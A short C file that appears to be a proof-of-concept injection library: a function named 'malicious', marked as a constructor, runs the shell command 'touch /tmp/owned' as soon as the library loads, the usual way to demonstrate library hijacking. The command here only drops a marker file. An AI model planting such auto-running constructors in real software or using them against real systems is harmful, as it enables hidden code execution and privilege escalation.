#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute((constructor));

void malicious() {
	system("touch /tmp/owned");
}
